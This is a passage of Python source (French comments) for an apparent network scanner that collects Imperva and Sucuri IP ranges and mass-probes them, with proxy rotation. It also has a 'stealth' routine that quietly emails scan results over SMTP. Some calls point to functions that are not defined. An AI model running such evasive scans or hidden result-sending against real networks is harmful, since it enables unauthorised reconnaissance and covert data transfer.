IMPERVA_ASN_LIST = [19551, 59623] 

# ==============================================
# FONCTIONS IMPERVA
# ==============================================

def fetch_imperva_cidrs() -> List[str]:
    """Version optimisée pour Imperva avec gestion fine des erreurs API"""
    cidrs = []
    
    # Essai API Imperva avec gestion spécifique du 403
    try:
        response = requests.get('https://api.imperva.com/ips', timeout=15)
        response.raise_for_status()  # Lèvera HTTPError pour les 4XX/5XX
        api_data = response.json()
        if ipv4_cidrs := api_data.get('ipv4', []):
            cidrs.extend(ipv4_cidrs)
            print(Fore.GREEN + f"  ✅ {len(ipv4_cidrs)} plages via API")
            return list(set(cidrs))
            
    except requests.HTTPError as http_err:
        if http_err.response.status_code != 403:  # Ne log que les erreurs autres que 403
            print(Fore.YELLOW + f"⚠️ Erreur API Imperva ({http_err.response.status_code}): {str(http_err)}")
    except requests.RequestException as api_error:
        print(Fore.YELLOW + f"⚠️ Erreur de connexion API: {str(api_error)}")
    
    # Fallback ASN (le reste reste identique)
    try:
        asn_cidrs = fetch_cidrs_multi_asn(IMPERVA_ASN_LIST)
        if asn_cidrs:
            cidrs.extend(asn_cidrs)
            return list(set(cidrs))
    except Exception as asn_error:
        print(Fore.RED + f"❌ Erreur ASN Imperva: {str(asn_error)}")
    
    # Fallback final
    print(Fore.YELLOW + "⚠️ Utilisation des plages statiques Imperva")
    return [
        "45.60.0.0/16",
        "45.223.0.0/16", 
        "192.230.64.0/18",
        "185.11.124.0/22"
    ]

def update_imperva_cidrs() -> bool:
    """
    Met à jour les CIDR Imperva de manière robuste avec journalisation.
    
    Returns:
        bool: True si la mise à jour a réussi
    """
    start_time = time.monotonic()
    print(Fore.CYAN + "\n🛡️ Début mise à jour Imperva...")
    temp_file = None
    
    try:
        cidrs = fetch_imperva_cidrs()
        
        # Validation stricte des CIDRs
        valid_cidrs = []
        invalid_count = 0
        
        for cidr in cidrs:
            if valid_cidr(cidr):
                valid_cidrs.append(cidr)
            else:
                invalid_count += 1
                
        if invalid_count:
            print(Fore.YELLOW + f"⚠️ {invalid_count} plages invalides filtrées")
            
        if not valid_cidrs:
            raise ValueError("Aucune plage valide après filtrage")
            
        # Tri par ordre numérique
        valid_cidrs.sort(key=lambda x: tuple(map(int, x.split('/')[0].split('.'))))
        
        # Écriture atomique
        temp_file = f"{IMPERVA_CIDR_FILE}.tmp"
        with open(temp_file, 'w', encoding='utf-8') as f:
            f.write("\n".join(valid_cidrs))
        
        os.replace(temp_file, IMPERVA_CIDR_FILE)
        
        elapsed = time.monotonic() - start_time
        print(Fore.GREEN + f"✅ {len(valid_cidrs)} plages Imperva sauvegardées ({elapsed:.2f}s)")
        return True
        
    except Exception as e:
        print(Fore.RED + f"❌ Crash mise à jour Imperva: {str(e)}")
        if temp_file and os.path.exists(temp_file):
            try:
                os.remove(temp_file)
            except OSError:
                pass
        return False

def scan_imperva_range(cidr: str, threads: int = 100, proxy: Optional[str] = None) -> None:
    """
    Lance un scan sur une plage CIDR Imperva avec gestion des erreurs.
    
    Args:
        cidr: Plage CIDR à scanner
        threads: Nombre de threads à utiliser
        proxy: Proxy à utiliser (optionnel)
    """
    print(Fore.MAGENTA + f"\n=== SCAN IMPERVA DE {cidr} ===")
    
    try:
        scanner = HostScanner(
            filename=None,
            ip_range=cidr,
            threads=threads,
            ping_timeout=1,
            http_timeout=10,
            proxy=proxy
        )
        scanner.run()
    except Exception as scan_error:
        print(Fore.RED + f"❌ Erreur lors du scan de {cidr}: {str(scan_error)}")

def start_imperva_scan(resume: bool = False, proxy: Optional[str] = None) -> None:
    """
    Gère le processus de scan complet avec reprise et journalisation.
    
    Args:
        resume: Reprendre le scan précédent si True
        proxy: Proxy à utiliser (optionnel)
    """
    # Vérification initiale
    if not os.path.exists(IMPERVA_CIDR_FILE):
        print(Fore.YELLOW + "ℹ Mise à jour initiale des CIDR Imperva...")
        if not update_imperva_cidrs():
            return

    # Chargement des CIDRs
    try:
        with open(IMPERVA_CIDR_FILE, 'r', encoding='utf-8') as f:
            all_cidrs = [line.strip() for line in f if line.strip()]
    except IOError as e:
        print(Fore.RED + f"❌ Impossible de lire le fichier CIDR: {str(e)}")
        return

    # Gestion de la reprise
    scanned_cidrs: Set[str] = set()
    if resume:
        try:
            if os.path.exists(IMPERVA_SCAN_PROGRESS_FILE):
                with open(IMPERVA_SCAN_PROGRESS_FILE, 'r', encoding='utf-8') as f:
                    scanned_cidrs = {line.strip() for line in f if line.strip()}
        except IOError as e:
            print(Fore.YELLOW + f"⚠️ Erreur lecture fichier progression: {str(e)}")

    to_scan = [cidr for cidr in all_cidrs if cidr not in scanned_cidrs]

    if not to_scan:
        print(Fore.GREEN + "✅ Toutes les plages Imperva ont été scannées.")
        return

    print(Fore.CYAN + f"🛡️ Début du scan Imperva ({len(to_scan)} plages restantes)")

    try:
        for cidr in to_scan:
            scan_imperva_range(cidr, proxy=proxy)
            
            try:
                with open(IMPERVA_SCAN_PROGRESS_FILE, 'a', encoding='utf-8') as f:
                    f.write(f"{cidr}\n")
            except IOError as e:
                print(Fore.YELLOW + f"⚠️ Erreur sauvegarde progression: {str(e)}")

    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n⏸ Scan Imperva interrompu par l'utilisateur.")
    except Exception as e:
        print(Fore.RED + f"\n❌ Erreur fatale Imperva: {str(e)}")
        
# ==============================================
# CONSTANTES SECURI
# ==============================================
SECURI_CIDR_FILE = "sucuri_cidrs.txt"
SECURI_SCAN_PROGRESS_FILE = "sucuri_scan_progress.txt"
# Sucuri - https://bgp.he.net/AS30148
SECURI_ASN_LIST = [30148, 398721]

# ==============================================
# FONCTIONS SECURI
# ==============================================

def fetch_sucuri_cidrs() -> List[str]:
    """
    Récupère les CIDRs de Sucuri avec fallback multi-sources.
    Version robuste avec gestion d'erreur fine et typage.
    
    Returns:
        List[str]: Liste des CIDRs IPv4 valides
    """
    cidrs = []
    
    # 1. Méthode principale: ASN
    try:
        cidrs = fetch_cidrs_multi_asn(SECURI_ASN_LIST)
        
        if not cidrs:
            raise ValueError("Aucune donnée ASN disponible")
            
        print(Fore.GREEN + f"✅ {len(cidrs)} plages Sucuri via ASN")
        return list(set(cidrs))  # Élimination des doublons
        
    except Exception as e:
        print(Fore.RED + f"❌ Erreur ASN Sucuri: {str(e)}")
        print(Fore.YELLOW + "➡️ Fallback vers plages statiques")
        
        # 2. Fallback statique si ASN échoue
        static_cidrs = [
            "192.124.249.0/24",  # Plages vérifiées
            "192.161.0.0/24",
            "192.88.134.0/23",
            "185.93.228.0/22"
        ]
        return static_cidrs

def update_sucuri_cidrs() -> bool:
    """
    Met à jour les CIDR Sucuri avec mécanisme de retry et validation.
    
    Returns:
        bool: True si la mise à jour a réussi
    """
    print(Fore.CYAN + "\n🔒 Début mise à jour Sucuri...")
    max_retries = 3
    temp_file = None
    
    for attempt in range(1, max_retries + 1):
        try:
            cidrs = fetch_sucuri_cidrs()
            
            # Validation des données
            if not cidrs:
                raise ValueError("Aucune plage CIDR récupérée")
                
            ipv4_count = sum(1 for c in cidrs if '.' in c and valid_cidr(c))
            if ipv4_count < 4:  # Minimum attendu pour les plages statiques
                raise ValueError(f"Données suspectes (seulement {ipv4_count} plages IPv4 valides)")
            
            # Tri des CIDRs
            cidrs = sorted(
                {c for c in cidrs if valid_cidr(c)},  # Filtrage + déduplication
                key=lambda x: tuple(map(int, x.split('/')[0].split('.')))
            )
            
            # Écriture atomique avec checksum
            temp_file = f"{SECURI_CIDR_FILE}.tmp"
            content = "\n".join(cidrs) + "\n"
            
            with open(temp_file, 'w', encoding='utf-8') as f:
                f.write(content)
                
            checksum = hashlib.md5(content.encode()).hexdigest()
            os.replace(temp_file, SECURI_CIDR_FILE)
            
            print(Fore.GREEN + f"✅ {len(cidrs)} plages Sucuri sauvegardées (md5: {checksum[:8]})")
            return True
            
        except Exception as e:
            print(Fore.RED + f"⚠️ Tentative {attempt}/{max_retries} échouée: {str(e)}")
            if temp_file and os.path.exists(temp_file):
                try:
                    os.remove(temp_file)
                except OSError:
                    pass
                    
            if attempt < max_retries:
                wait_time = 2 ** attempt  # Backoff exponentiel
                print(Fore.YELLOW + f"⏳ Nouvelle tentative dans {wait_time}s...")
                time.sleep(wait_time)
    
    print(Fore.RED + "❌ Abandon après multiples échecs")
    return False

def scan_sucuri_range(cidr: str, threads: int = 100, proxy: Optional[str] = None) -> None:
    """
    Lance un scan sur une plage CIDR Sucuri avec gestion des erreurs.
    
    Args:
        cidr: Plage CIDR à scanner
        threads: Nombre de threads à utiliser
        proxy: Proxy à utiliser (optionnel)
    """
    print(Fore.MAGENTA + f"\n=== SCAN SECURI DE {cidr} ===")
    
    try:
        scanner = HostScanner(
            filename=None,
            ip_range=cidr,
            threads=threads,
            ping_timeout=1,
            http_timeout=10,
            proxy=proxy
        )
        scanner.run()
    except Exception as scan_error:
        print(Fore.RED + f"❌ Erreur lors du scan de {cidr}: {str(scan_error)}")

def start_sucuri_scan(resume: bool = False, proxy: Optional[str] = None) -> None:
    """
    Gère le processus de scan complet Sucuri avec reprise et journalisation.
    
    Args:
        resume: Reprendre le scan précédent si True
        proxy: Proxy à utiliser (optionnel)
    """
    # Vérification initiale
    if not os.path.exists(SECURI_CIDR_FILE):
        print(Fore.YELLOW + "ℹ Mise à jour initiale des CIDR Sucuri...")
        if not update_sucuri_cidrs():
            return

    # Chargement des CIDRs
    try:
        with open(SECURI_CIDR_FILE, 'r', encoding='utf-8') as f:
            all_cidrs = [line.strip() for line in f if line.strip() and valid_cidr(line.strip())]
    except IOError as e:
        print(Fore.RED + f"❌ Impossible de lire le fichier CIDR: {str(e)}")
        return

    # Gestion de la reprise
    scanned_cidrs: Set[str] = set()
    if resume:
        try:
            if os.path.exists(SECURI_SCAN_PROGRESS_FILE):
                with open(SECURI_SCAN_PROGRESS_FILE, 'r', encoding='utf-8') as f:
                    scanned_cidrs = {line.strip() for line in f if line.strip()}
        except IOError as e:
            print(Fore.YELLOW + f"⚠️ Erreur lecture fichier progression: {str(e)}")

    to_scan = [cidr for cidr in all_cidrs if cidr not in scanned_cidrs]

    if not to_scan:
        print(Fore.GREEN + "✅ Toutes les plages Sucuri ont été scannées.")
        return

    print(Fore.CYAN + f"🔒 Début du scan Sucuri ({len(to_scan)} plages restantes)")

    try:
        for cidr in to_scan:
            scan_sucuri_range(cidr, proxy=proxy)
            
            try:
                with open(SECURI_SCAN_PROGRESS_FILE, 'a', encoding='utf-8') as f:
                    f.write(f"{cidr}\n")
            except IOError as e:
                print(Fore.YELLOW + f"⚠️ Erreur sauvegarde progression: {str(e)}")

    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n⏸ Scan Sucuri interrompu par l'utilisateur.")
    except Exception as e:
        print(Fore.RED + f"\n❌ Erreur fatale Sucuri: {str(e)}")
        
def valid_cidr(cidr):
    """Valide le format CIDR"""
    try:
        ip, mask = cidr.split('/')
        return all(0 <= int(part) <= 255 for part in ip.split('.')) and (0 <= int(mask) <= 32)
    except:
        return False

def vider_repertoire_tmp_interactif():
    from datetime import datetime

    tmp_dir = "tmp"
    if not os.path.exists(tmp_dir):
        print(Fore.YELLOW + "ℹ Aucun dossier 'tmp/' trouvé.")
        return

    fichiers = sorted(
        [f for f in os.listdir(tmp_dir) if f.endswith(".tmp")],
        key=lambda x: os.path.getmtime(os.path.join(tmp_dir, x))
    )

    if not fichiers:
        print(Fore.YELLOW + "ℹ Aucun fichier .tmp à supprimer.")
        return

    mois_fr = {
        1: 'Janvier', 2: 'Février', 3: 'Mars', 4: 'Avril',
        5: 'Mai', 6: 'Juin', 7: 'Juillet', 8: 'Août',
        9: 'Septembre', 10: 'Octobre', 11: 'Novembre', 12: 'Décembre'
    }

    print(Fore.CYAN + f"\n🧹 {len(fichiers)} fichier(s) trouvés dans '{tmp_dir}':\n")
    infos = []

    for idx, f in enumerate(fichiers, 1):
        path = os.path.join(tmp_dir, f)
        try:
            ts = os.path.getmtime(path)
            dt = datetime.fromtimestamp(ts)
            formatted_time = f"{dt.day} {mois_fr[dt.month]} {dt.year} — {dt.strftime('%H:%M')}"
        except:
            formatted_time = "inconnu"
        infos.append((f, formatted_time, ts))
        print(Fore.YELLOW + f"{idx}. {f.ljust(20)} {Fore.LIGHTBLACK_EX}{formatted_time}")

    print(Fore.CYAN + "\nEntrez les numéros à supprimer (ex: 1 3), * pour tout, ou 'a' pour tout sauf le + récent.")
    choix = input(Fore.MAGENTA + ">>> Votre choix : ").strip()

    if choix == "*":
        selection = [f for f, _, _ in infos]
    elif choix == "a":
        selection = [f for f, _, _ in infos[:-1]]
    else:
        try:
            index = [int(i) - 1 for i in choix.split() if i.isdigit()]
            selection = [infos[i][0] for i in index if 0 <= i < len(infos)]
        except Exception as e:
            print(Fore.RED + f"❌ Erreur de sélection : {e}")
            return

    if not selection:
        print(Fore.YELLOW + "❌ Aucun fichier sélectionné.")
        return

    print(Fore.CYAN + f"\nTentative d'envoi avant suppression...")
    envoyes, conserves = 0, 0
    for f in selection:
        path = os.path.join(tmp_dir, f)
        try:
            with open(path, 'r', encoding='utf-8', errors='ignore') as file:
                contenu = file.read().strip()

            # On vérifie si c'est un fichier de résultat de scan
            if contenu and ("Host:" in contenu or "open port" in contenu or "scan" in f):
                if send_email(subject=f"Résultat: {f}", body=contenu):
                    os.remove(path)
                    envoyes += 1
                    continue
                else:
                    conserves += 1
                    continue
            else:
                os.remove(path)
        except Exception as e:
            print(Fore.LIGHTRED_EX + f"Erreur sur {f} : {e}")

    print(Fore.GREEN + f"\n✅ Nettoyage terminé. Fichiers envoyés : {envoyes} | Conservés (échec d'envoi) : {conserves}")
# ==============================================
# CLASSE HOSTSCANNER
# ==============================================

class HostScanner:
    def __init__(self, filename=None, ip_range=None, threads=100,
                 ping_timeout=1, http_timeout=10, silent=False,
                 export_csv=False, proxy=None, turbo_mode=False):

        # Événements de contrôle
        self.paused = threading.Event()
        self.stopped = threading.Event()
        self.paused.clear()
        self.stopped.clear()

        # Configuration utilisateur
        self.filename = filename
        self.ip_range = ip_range
        self.threads = min(threads, 500)
        self.ping_timeout = ping_timeout
        self.http_timeout = http_timeout
        self.silent = silent
        self.export_csv = export_csv
        self.proxy = proxy
        self.turbo_mode = turbo_mode

        # Gestion des proxys
        self.proxy_manager = None
        self.proxy_rotator = None
        if self.proxy == "auto":
            self.proxy_manager = ProxyManager()
            self.proxy_rotator = ProxyRotator(self.proxy_manager)

        self.proxy_failures = defaultdict(int)
        self.max_proxy_failures = 3  # Échecs maximum avant blacklisting

        # Statistiques et résultats
        self.results = {"Up": [], "Down": []}
        self.active_hosts = []
        self.last_up_hosts = []
        self.total_hosts = 0
        self.processed = 0

        # Contrôle d’exécution
        self.scan_active = False
        self.lock = threading.Lock()

        # Affichage
        self.last_display_time = 0
        self.display_interval = 0.5
        
    def _print_status_block(self, count, last_event=""):
        now = time.time()
    
        if not hasattr(self, '_spinner_index'):
            self._spinner_index = 0
        if not hasattr(self, '_start_time'):
            self._start_time = now
    
        # Préchargé une seule fois
        if not hasattr(self, '_spinner'):
            self._spinner = ['|', '/', '-', '\\']
            self._spinner_len = len(self._spinner)
    
        spin_char = self._spinner[self._spinner_index % self._spinner_len]
        self._spinner_index += 1
    
        elapsed = int(now - self._start_time)
        timer = f"{elapsed // 60:02}:{elapsed % 60:02}"
    
        proxy_line = ""
        if getattr(self, 'proxy_rotator', None):
            proxy = self.proxy_rotator.current_proxy
            remaining = self.proxy_rotator.reuse_limit - self.proxy_rotator.usage_count
            if proxy:
                proxy_line = f"📊 Proxy actif : {proxy} | Restant : {remaining}"
    
        try:
            cols = shutil.get_terminal_size().columns
        except Exception:
            cols = 80  # fallback par défaut
    
        lines = [
            Fore.CYAN + f"{spin_char} {count} hôtes analysés | {len(self.active_hosts)} actifs | ⏱ {timer}",
            Fore.MAGENTA + proxy_line if proxy_line else "",
            Fore.YELLOW + last_event if last_event else ""
        ]
    
        print("\n".join(line.ljust(cols - 1) for line in lines if line), end='\r')
        self.last_display_time = now
        
    def _enable_turbo_mode(self):
        """Configure les paramètres pour haute vitesse"""
        self.ping_timeout = 0.5
        self.http_timeout = 3
        self.proxy_rotation_delay = 0
        self.max_proxy_retries = 1
        print(Fore.YELLOW + "⚡ Mode Turbo activé")

    def load_hosts(self):
        hosts = []
        if self.ip_range:
            try:
                network = ipaddress.IPv4Network(self.ip_range, strict=False)
                hosts = [str(ip) for ip in network.hosts()]
            except ValueError:
                print(Fore.RED + "❌ Erreur : La plage CIDR spécifiée est invalide.")
                sys.exit(1)
        elif self.filename:
            hosts = self.load_hosts_from_file(self.filename)
        return [host for host in hosts if not self.is_private_ip(host)]

    def load_hosts_from_file(self, filename):
        hosts = []
        try:
            with open(filename, 'r') as file:
                for line in file:
                    line = line.strip()
                    if line:
                        try:
                            network = ipaddress.IPv4Network(line, strict=False)
                            hosts.extend([str(ip) for ip in network.hosts()])
                        except ValueError:
                            hosts.append(line)
            if not hosts:
                print(Fore.RED + f"❌ Erreur : Le fichier {filename} ne contient aucune IP ou CIDR valide.")
                sys.exit(1)
        except FileNotFoundError:
            print(Fore.RED + f"❌ Erreur : Fichier {filename} introuvable.")
            sys.exit(1)
    
        return hosts

    def is_ipv4(self, host):
        try:
            socket.inet_aton(host)
            return True
        except socket.error:
            return False

    def is_private_ip(self, ip):
        try:
            return ipaddress.ip_address(ip).is_private
        except ValueError:
            return False

    def ping_host(self, host):
        try:
            response = ping(host, timeout=self.ping_timeout)
            return response is not None
        except Exception:
            return False

    def http_check(self, host):
        """Effectue une requête HTTP et extrait les infos serveur"""
        while self.paused.is_set():
            if self.stopped.is_set():
                return None, "", "", ""
            time.sleep(0.1)
    
        proxies = None
        if self.proxy == "auto" and hasattr(self, 'proxy_rotator'):
            proxy_url = self.proxy_rotator.get_next_proxy()
            if proxy_url:
                proxies = {"http": proxy_url, "https": proxy_url}
    
        try:
            response = requests.get(
                f"http://{host}",
                proxies=proxies,
                timeout=self.http_timeout,
                verify=False,
                allow_redirects=True,
                headers={"User-Agent": "Mozilla/5.0"}
            )
            server_type = response.headers.get("Server", "Inconnu")
            powered_by = response.headers.get("X-Powered-By", "Inconnu")
            return response.status_code, response.reason, server_type, powered_by
        except Exception:
            return None, "", "", ""
        
    def _optimized_host_generator(self):
        """Génère dynamiquement les hôtes à partir de ip_range ou d'un fichier (avec support CIDR)."""
        def generate_from_network(network_str):
            try:
                network = ipaddress.IPv4Network(network_str, strict=False)
                for ip in network.hosts():
                    if self.stopped.is_set():
                        return
                    yield str(ip)  # Ne filtre PAS les IPs privées
            except ValueError:
                yield network_str  # Nom de domaine ou IP directe
    
        if self.ip_range:
            yield from generate_from_network(self.ip_range)
        elif self.filename:
            try:
                with open(self.filename, 'r') as file:
                    for line in file:
                        if self.stopped.is_set():
                            return
                        line = line.strip()
                        if line:
                            yield from generate_from_network(line)
            except FileNotFoundError:
                print(Fore.RED + f"❌ Fichier {self.filename} introuvable")
                sys.exit(1)
    
    def _file_host_generator(self):
        """Génère les hôtes depuis un fichier (avec pause/stop)"""
        try:
            with open(self.filename, 'r') as f:
                for line in f:
                    if self.stopped.is_set():
                        break
    
                    while self.paused.is_set() and not self.stopped.is_set():
                        time.sleep(0.1)
    
                    line = line.strip()
                    if line and not line.startswith("#"):
                        yield line
        except Exception as e:
            print(Fore.RED + f"❌ Erreur de lecture du fichier {self.filename} : {e}")
        
    def run(self):
        """Version complète avec gestion correcte de pause/stop et support CIDR depuis fichier"""
        self._init_controls()
        start_time = time.time()
        self.active_hosts = []
        self.last_up_hosts = []
    
        print(Fore.CYAN + "┌" + "─" * 40 + "┐")
        print(Fore.CYAN + "│" + "SCAN RÉSEAU".center(40) + "│")
        print(Fore.CYAN + "└" + "─" * 40 + "┘")
        print(Fore.YELLOW + f"Threads: {self.threads} | Mode: {'Silencieux' if self.silent else 'Standard'}\n")
    
        if self.proxy == "auto":
            threading.Thread(target=monitor_proxy_usage, args=(self,), daemon=True).start()
    
        try:
            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                futures = {}
                host_count = 0
    
                # Utilise toujours _optimized_host_generator, car il gère fichier + CIDR
                source = self._optimized_host_generator()
    
                for host in source:
                    if self.stopped.is_set():
                        break
    
                    while self.paused.is_set():
                        time.sleep(0.1)
                        if self.stopped.is_set():
                            break
    
                    if self.stopped.is_set():
                        break
    
                    future = executor.submit(self._check_host_wrapper, host)
                    futures[future] = host
                    host_count += 1
    
                    while len(futures) >= self.threads and not self.stopped.is_set():
                        self._process_futures(futures)
                        time.sleep(0.01)
    
                    self._display_minimal_progress(host_count)
    
                while futures and not self.stopped.is_set():
                    self._process_futures(futures)
    
        except Exception as e:
            print(Fore.RED + f"\nERREUR: {str(e)}")
    
        finally:
            self.scan_active = False
            with self.lock:
                self.last_up_hosts = [host[0] for host in self.active_hosts]
            if not self.stopped.is_set():
                self._final_summary(start_time)
            else:
                print(Fore.RED + "\n🛑 Scan interrompu manuellement.")
            self.save_results()
        
    def _init_controls(self):
        """Affiche les contrôles et démarre le thread de gestion"""
        if not self.silent:
            print(Fore.YELLOW + "\nContrôles actifs :")
            print(Fore.CYAN + "- p + Entrée : Pause")
            print(Fore.CYAN + "- r + Entrée : Reprise")
            print(Fore.CYAN + "- s + Entrée : Arrêt\n")
    
            self.scan_active = True
            self.control_thread = threading.Thread(target=self._input_controller, daemon=True)
            self.control_thread.start()
    
    
    def _input_controller(self):
        """Thread en arrière-plan pour surveiller les commandes clavier"""
        while self.scan_active and not self.stopped.is_set():
            try:
                if select.select([sys.stdin], [], [], 0.1)[0]:
                    cmd = sys.stdin.readline().strip().lower()
                    with self.lock:
                        if cmd == 'p':
                            self.paused.set()
                            print(Fore.YELLOW + "\n⏸ Pause activée (r pour reprendre)")
                        elif cmd == 'r':
                            self.paused.clear()
                            print(Fore.GREEN + "▶ Reprise du scan")
                        elif cmd == 's':
                            self.stopped.set()
                            self.scan_active = False
                            print(Fore.RED + "\n⏹ Scan arrêté par l'utilisateur")
                            return
            except:
                pass
    
    def check_host(self, host):
        """Version avec feedback conditionnel et respect de la pause"""
        result = (host, "Down", "Non testé", "", "", "")
        try:
            while self.paused.is_set():
                if self.stopped.is_set():
                    return result
                time.sleep(0.1)
    
            is_reachable = False
            reason = ""
            server_name = ""
            server_type = "Inconnu"
            powered_by = "Inconnu"
    
            # S'assurer que l'URL est bien formée
            def format_url(h):
                if not h.startswith("http://") and not h.startswith("https://"):
                    return f"http://{h}"
                return h
    
            if self.is_ipv4(host):
                if self.ping_host(host):
                    is_reachable = True
                    reason = "Ping OK"
                    server_name = get_server_name(host)
            else:
                formatted_host = format_url(host)
                status_code, response_reason, server_type, powered_by = self.http_check(formatted_host)
                if status_code:
                    is_reachable = True
                    reason = f"{status_code} {response_reason}"
                    server_name = get_server_name(host)
    
            status = "Up" if is_reachable else "Down"
            result = (host, status, reason, server_name, server_type, powered_by)
            self.results[status].append(result)
    
            if not self.silent and status == "Up":
                print(Fore.GREEN + f"✅ {host.ljust(15)} - {reason}")
    
            return result
    
        except Exception as e:
            if not self.silent:
                print(Fore.RED + f"❌ Erreur avec {host}: {str(e)}")
            return (host, "Error", str(e), "", "", "")
        
    def _check_host_wrapper(self, host):
        """Enveloppe sécurisée du scan"""
        result = self.check_host(host)
        if result[1] == "Up":
            with self.lock:
                self.active_hosts.append(result)
        return result
    
    def _process_futures(self, futures):
        """Nettoie les tâches terminées et affiche les erreurs"""
        try:
            done, _ = wait(list(futures.keys()), timeout=0.1, return_when=concurrent.futures.FIRST_COMPLETED)
            for future in done:
                host = futures.pop(future)
                try:
                    future.result()
                except Exception as e:
                    if not self.silent:
                        print(Fore.YELLOW + f"⚠️ Erreur avec {host}: {str(e)}")
        except Exception as e:
            if not self.silent:
                print(Fore.RED + f"❌ Erreur de traitement: {str(e)}")
    
    
    def _display_minimal_progress(self, count):
        """Affiche un résumé dynamique sans inonder l'écran"""
        current_time = time.time()
        if not hasattr(self, '_spinner_index'):
            self._spinner_index = 0
        if not hasattr(self, '_start_time'):
            self._start_time = current_time
    
        if current_time - self.last_display_time > self.display_interval:
            spinner = ['|', '/', '-', '\\']
            spin_char = spinner[self._spinner_index % len(spinner)]
            self._spinner_index += 1
    
            elapsed = int(current_time - self._start_time)
            minutes, seconds = divmod(elapsed, 60)
            timer = f"{minutes:02}:{seconds:02}"
    
            cols = os.get_terminal_size().columns
            msg = f"{spin_char} {count} hôtes analysés | {len(self.active_hosts)} actifs | ⏱ {timer}"
            print(Fore.CYAN + msg.ljust(cols - 1), end='\r')
    
            self.last_display_time = current_time
    
    
    def _final_summary(self, start_time):
        """Affiche un résumé de fin de scan"""
        duration = time.time() - start_time
        total = self.processed if hasattr(self, 'processed') else len(self.active_hosts)
        console.print("\n[bold blue]===[ IPToP ]===\n[/bold blue]")
        print("\n" + Fore.CYAN + "═" * 58)
        print(Fore.GREEN + "SCAN TERMINÉ".center(58))
        print(Fore.CYAN + "═" * 58)
        print(Fore.YELLOW + f"⏱  Durée : {int(duration // 60)} min {int(duration % 60)} sec")
        print(Fore.GREEN + f"✅ Hôtes actifs   : {len(self.active_hosts)}")
        print(Fore.RED + f"❌ Hôtes inactifs : {total - len(self.active_hosts)}")
        print(Fore.CYAN + f"📊 Total analysé  : {total}")
        print(Fore.CYAN + "═" * 58 + "\n")
    
        if self.active_hosts:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"active_hosts_{timestamp}.txt"
            with open(filename, "w", encoding="utf-8") as f:
                for host in self.active_hosts:
                    f.write(f"{host[0]}\n" if isinstance(host, tuple) else f"{host}\n")
            print(Fore.BLUE + f"Résultats sauvegardés dans {filename}")
        else:
            print(Fore.YELLOW + "Aucun hôte actif — aucun fichier sauvegardé.")
    
    def save_results(self):
        """Sauvegarde les résultats du scan dans un fichier tmp/ avec un format lisible."""
        os.makedirs("tmp", exist_ok=True)
        filename = f"tmp/scan_{int(time.time())}.tmp"
        
        try:
            with open(filename, 'w') as f:
                f.write("=== RÉSULTATS DU SCAN ===\n")
                f.write(f"Date : {datetime.now()}\n")
                f.write(f"Hôtes actifs : {len(self.active_hosts)}\n\n")
                for host in self.active_hosts:
                    ip = host[0]
                    status = host[2] if len(host) > 2 else "Aucun statut"
                    f.write(f"{ip} - {status}\n")
        except Exception as e:
            print(Fore.RED + f"Erreur lors de la sauvegarde : {e}")
        
        return filename
    
    def rescan_active_hosts(self):
        """Re-scan des hôtes actifs détectés lors du scan précédent."""
        if not hasattr(self, 'last_up_hosts') or not self.last_up_hosts:
            print(Fore.YELLOW + "⚠️ Aucun hôte actif à re-scanner")
            return
    
        print(Fore.CYAN + "\n🔁 Re-scan des hôtes actifs en cours...")
        self.results = {"Up": [], "Down": []}
        start_time = time.time()
    
        scanner = HostScanner(
            filename=None,
            ip_range=None,
            threads=self.threads,
            ping_timeout=self.ping_timeout,
            http_timeout=self.http_timeout,
            proxy=self.proxy
        )
    
        temp_file = "temp_rescan.txt"
        with open(temp_file, 'w') as f:
            f.write("\n".join(self.last_up_hosts))
    
        try:
            scanner.filename = temp_file
            scanner.run()
            self.results = scanner.results
            self.last_up_hosts = scanner.last_up_hosts
        finally:
            if os.path.exists(temp_file):
                os.remove(temp_file)
    
        duration = time.time() - start_time
        print(Fore.GREEN + f"\n⏱ Re-scan terminé en {duration:.2f} secondes")

    def summary(self, total_time):
        """Affiche un résumé des résultats"""
        headers = ["Hôte", "Statut", "Détails", "Nom", "Type", "Powered By"]
        if self.results["Up"]:
            print(Style.BRIGHT + Fore.GREEN + "\n📶 Hôtes actifs:\n")
            print(tabulate(self.results["Up"], headers=headers, tablefmt="fancy_grid"))
        console.print("\n[bold blue]===[ IPToP ]===\n[/bold blue]")
        print(Fore.CYAN + f"\n⏱ Temps total: {total_time:.2f}s")
        print(Fore.GREEN + f"✅ Hôtes actifs: {len(self.results['Up'])}")
        print(Fore.RED + f"❌ Hôtes inactifs: {len(self.results['Down'])}")
        print(Fore.MAGENTA + "\n🔍 Analyse terminée.")

    def send_email(self, subject, body):
        """Version corrigée et unifiée"""
        try:
            # Utilise la même configuration que le système anonyme
            from email.mime.text import MIMEText
            from email.mime.multipart import MIMEMultipart
            import smtplib
            
            msg = MIMEMultipart()
            msg['From'] = SMTP_CONFIG['user']
            msg['To'] = SMTP_CONFIG['user']
            msg['Subject'] = subject
            msg.attach(MIMEText(body, 'plain'))
            
            with smtplib.SMTP(SMTP_CONFIG['server'], SMTP_CONFIG['port']) as server:
                server.starttls()
                server.login(SMTP_CONFIG['user'], SMTP_CONFIG['password'])
                server.send_message(msg)
            return True
            
        except Exception as e:
            print(Fore.RED + f"❌ Échec d'envoi silencieux (SMTP)")
            return False

    def _save_results_stealth(self):
        """Sauvegarde indétectable des résultats"""
        temp_name = f"results_{int(time.time())}.tmp"
        
        # Écriture sécurisée sans métadonnées
        with open(temp_name, 'wb') as f:
            content = "\n".join(f"{host[0]}" for host in self.active_hosts)
            f.write(content.encode('utf-8'))
        
        # Lance le traitement silencieux
        if '_email_thread' not in globals():
            globals()['_email_thread'] = threading.Thread(
                target=_process_results_stealth,
                daemon=True
            )
            _email_thread.start()

# ==============================================
# FONCTIONS DE GESTION DE FICHIERS (EXISTANTES)
# ==============================================

class TextFileManager:
    class DNSResolver:
        """Classe interne pour la résolution DNS avancée"""
        @staticmethod
        def is_valid_ip(ip: str) -> bool:
            """Vérifie si une chaîne est une IP valide"""
            try:
                ipaddress.ip_address(ip)
                return True
            except ValueError:
                return False

        @staticmethod
        def resolve_ip(ip: str) -> Dict:
            """Résolution DNS avec gestion des erreurs"""
            try:
                if not TextFileManager.DNSResolver.is_valid_ip(ip):
                    return {'ip': ip, 'domain': None, 'status': 'FAIL', 'error': 'Invalid IP format'}

                socket.setdefaulttimeout(5)
